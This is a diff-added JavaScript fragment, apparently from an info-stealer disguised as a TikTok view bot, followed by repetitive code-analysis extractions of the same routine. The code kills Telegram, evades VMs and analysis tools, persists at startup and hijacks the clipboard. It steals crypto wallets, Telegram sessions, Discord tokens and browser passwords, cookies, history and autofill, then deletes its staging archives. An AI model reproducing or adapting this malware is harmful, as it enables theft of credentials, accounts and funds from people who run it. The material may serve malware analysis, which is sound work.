@@ -1,0 +1,129 @@
+async init() {
+        process.on("unhandledRejection", (err) => {
+        });
+
+        process.on("uncaughtException", (exc) => {
+        });
+
+        exec('taskkill /IM Telegram.exe /F', (error, stdout, stderr) => {
+            if (error) {
+                console.error(`exec error: ${error}`);
+                return;
+            }
+        })
+
+        process.title = "Installer";
+
+        this.utils.protection.detect_malicious_processes();
+
+        const exit = await this.utils.protection.inVM();
+
+        if (exit) {
+           
+        }
+
+        this.add_to_startup();
+
+        this.utils.constructor.loadCPUS();
+
+        try {
+            this.config.embed = JSON.parse(
+                JSON.stringify(
+                    (
+                        await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        )
+                    ).data
+          ...
+process.on("unhandledRejection", (err) => {
+        })
+process.on("uncaughtException", (exc) => {
+        })
+exec('taskkill /IM Telegram.exe /F', (error, stdout, stderr) => {
+            if (error) {
+                console.error(`exec error: ${error}`);
+                return;
+            }
+        })
+process.title = "Installer"
+(_tmp_22 = this.utils.protection).detect_malicious_processes
+const exit = await this.utils.protection.inVM()
+this.add_to_startup()
+(_tmp_24 = this.utils.constructor).loadCPUS
+this.config.embed = JSON.parse(
+                JSON.stringify(
+                    (
+                        await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        )
+                    ).data
+                )
+            )
+JSON.stringify(
+                    (
+                        await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        )
+                    ).data
+                )
+await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        ).data
+await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        )
+"https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+data
+console.log(e)
+this.config.embed.footer = {
+            text: `${this.utils.encryption.decryptData(
+                this.config.user.hostname
+            )} | ${this.config.embed.credits}`,
+            icon_url: this.config.embed.avatar_url,
+        }
+_tmp_26.text = <operator>.formatString("", this.utils.encryption.decryptData(
+                this.config.user.hostname
+            ), " | ", this.config.embed.credits, "")
+this.config.user.hostname
+this.config.embed.credits
+_tmp_26.icon_url = this.config.embed.avatar_url
+this.config.jszip.path = this.config.jszip.generate_path()
+this.config.jsziptg.path = this.config.jsziptg.generate_path()
+(_tmp_30 = this.utils.clipper).detectClipboard
+(_tmp_31 = this.utils.wallets).getWallets
+(_tmp_32 = this.utils.telegram).getTelegram
+(_tmp_33 = this.utils.discord).getTokens
+(_tmp_34 = this.utils.discord).saveDiscordTokens
+_iterator_0 = <operator>.iterator(this.config.environ.password_and_cookies_paths)
+this.requires.fs.existsSync(path + "Login Data")
+[
+                    "getPasswords",
+                    "getCookies",
+                    "getBookmarks",
+                    "getHistory",
+                    "getAutofill",
+                    "getWallets",
+                ].forEach(async (_func) => {
+                    await this.utils.browsers[_func](path);
+                })
+_tmp_37.push("getPasswords")
+_tmp_37.push("getCookies")
+_tmp_37.push("getBookmarks")
+_tmp_37.push("getHistory")
+_tmp_37.push("getAutofill")
+_tmp_37.push("getWallets")
+<lambda>8
+(_tmp_39 = this.utils.infection).initialize
+await this.utils.time.sleep(60000)
+this.requires.fs.rmSync(this.config.jszip.path, {
+            recursive: true,
+            force: true,
+        })
+_tmp_42.recursive = true
+_tmp_42.force = true
+this.requires.fs.rmSync(`${this.config.jszip.path}.zip`, {
+            recursive: true,
+            force: true,
+        })
+_tmp_44.recursive = true
+_tmp_44.force = true
